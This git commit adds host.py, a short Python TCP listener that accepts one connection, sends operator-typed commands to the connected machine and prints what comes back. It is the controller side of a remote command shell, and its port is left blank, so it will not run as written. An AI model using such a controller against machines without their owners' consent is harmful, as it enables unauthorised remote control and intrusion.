619d6b5aa2429cff600ed7d46180c4a12f34dda4
melker12345 <61610881+melker12345@users.noreply.github.com>
2023-03-03 14:32:34 +0100

    Create host.py

---
+++ host.py# This is the sever/host.py
@@ -0,0 +1,25 @@
+# This is the sever/host script
+import socket
+
+HOST = '' # Enter your ip address 
+PORT =    # Enter port number
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.bind((HOST, PORT))
+s.listen()
+
+print(f"[*] Listening on {HOST}:{PORT}")
+
+conn, addr = s.accept()
+print(f"[*] Connection from {addr[0]}:{addr[1]}")
+
+while True:
+    command = input('Enter command: ')
+    conn.sendall(command.encode())
+    if command.lower() == 'exit':
+        conn.close()
+        break
+    result = conn.recv(1024).decode()
+    print(result)
+
+s.close()
